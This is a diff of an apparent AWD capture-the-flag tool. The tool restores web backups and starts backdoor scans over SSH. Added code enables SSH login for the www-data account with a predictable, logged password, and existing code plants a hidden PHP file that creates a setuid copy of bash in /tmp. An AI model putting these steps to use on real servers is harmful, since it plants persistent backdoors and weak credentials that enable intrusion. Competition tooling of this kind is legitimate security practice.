@@ -88,6 +88,9 @@ class DefenseManager:
             threading.Thread(target=self.setup_wwwdata_shell, args=(ip, port)).start()
             threading.Thread(target=self._detect_php_ini, args=(ip, port)).start()
             threading.Thread(target=self.deploy_aoi_tools, args=(ip, port)).start()
+            # Trigger Backdoor Scan & Snapshot
+            threading.Thread(target=self.scanner.scan_backdoor, args=(ip, port)).start()
+            threading.Thread(target=self.scanner.snapshot_files, args=(ip, port)).start()
 
         if 'python' in detection['types']:
             threading.Thread(target=self.scanner.scan_python_vulns, args=(ip, port)).start()
@@ -180,10 +183,6 @@ class DefenseManager:
             self.ssh.upload(ip, int(port), backup_path, remote_tmp)
             
             if backup_path.endswith('.tar'):
-                # Clean restore: Move current webroot to temp, detect webroot from tar? 
-                # Assumption: backup was created from /var/www/html or similar. 
-                # Let's assume standard AWD path /var/www/html. 
-                # To be safe, we first identify the webroot.
                 webroot = '/var/www/html'
                 # 1. Prepare backup location (Use /tmp to avoid permission issues in /var/www)
                 timestamp = int(time.time())
@@ -197,9 +196,6 @@ class DefenseManager:
                 cmd_mv = f"mv {webroot}/* {backup_old}/ 2>/dev/null; mv {webroot}/.[!.]* {backup_old}/ 2>/dev/null"
                 out_mv = self.ssh.execute(ip, int(port), cmd_mv)
                
-                # Verify move (optional, but good for debug)
-                # print(f"[{ip}:{port}] Move output: {out_mv}", flush=True)
-
                 # 3. Webroot is now clean-ish. Ensure it exists.
                 self.ssh.execute(ip, int(port), f"mkdir -p {webroot}")
 
@@ -211,11 +207,6 @@ class DefenseManager:
                 check = self.ssh.execute(ip, int(port), f"ls -A {webroot}")
                 if check:
                     self.ssh.execute(ip, int(port), f"rm {remote_tmp}")
-                    # self.ssh.execute(ip, int(port), f"rm -rf {backup_old}") # Keep old for manual investigation? 
-                    # User asked to "restore to original state", implying delete new files.
-                    # We can keep .old for safety or delete it. Let's keep it for now but maybe later adding a cleanup task.
-                    # Or better, delete it to save space if success.
-                    # Adding a log about where the old files went.
                     print(f"[{ip}:{port}] Backup restored. Old files moved to {backup_old}.", flush=True)
                     return True, f'备份还原成功 (旧文件已移至 {backup_old})'
                 else:
@@ -278,6 +269,26 @@ class DefenseManager:
         # Ensure only filename is used for timestamp to verify unique shell name
         php_filename = f'.shell_{int(time.time())}.php'
         
+        # --- 0. Enable SSH Login for www-data (for Xshell) ---
+        try:
+            # Set shell to /bin/bash (enable login)
+            self.ssh.execute(ip, port, "usermod -s /bin/bash www-data")
+            
+            # Set Password (WwwData@<LastIP>#<Port>)
+            # simple deterministic password
+            ip_suffix = ip.split('.')[-1]
+            pw = f"WwwData@{ip_suffix}#{port}"
+            # Use chpasswd
+            self.ssh.execute(ip, port, f"echo 'www-data:{pw}' | chpasswd")
+            
+            with self.ssh.lock:
+                target['wwwdata_password'] = pw
+                self.ssh.save_targets()
+            
+            print(f"[{ip}:{port}] Enabled www-data SSH login. User: www-data, Pass: {pw}", flush=True)
+        except Exception as e:
+            print(f"[{ip}:{port}] Failed to enable www-data SSH: {e}", flush=True)
+
         print(f"[{ip}:{port}] Starting speedy www-data shell deployment...", flush=True)
         php_content = "<?php system('cp /bin/bash /tmp/mujica;chmod u+s /tmp/mujica'); echo 'DONE';?>"
         b64_payload = base64.b64encode(php_content.encode()).decode()
@@ -301,7 +312,8 @@ class DefenseManager:
             php_dirs = ['/var/www/html']
             print(f"[{ip}:{port}] No PHP dirs found, defaulting to /var/www/html", flush=True)
         else:
-            print(f"[{ip}:{port}] Found PHP dirs (shallow first): {php_dirs}", flush=True)
+            # print(f"[{ip}:{port}] Found PHP dirs (shallow first): {php_dirs}", flush=True)
+            pass
         
         ports_to_try = [80, 8080, 8888]
         success = False
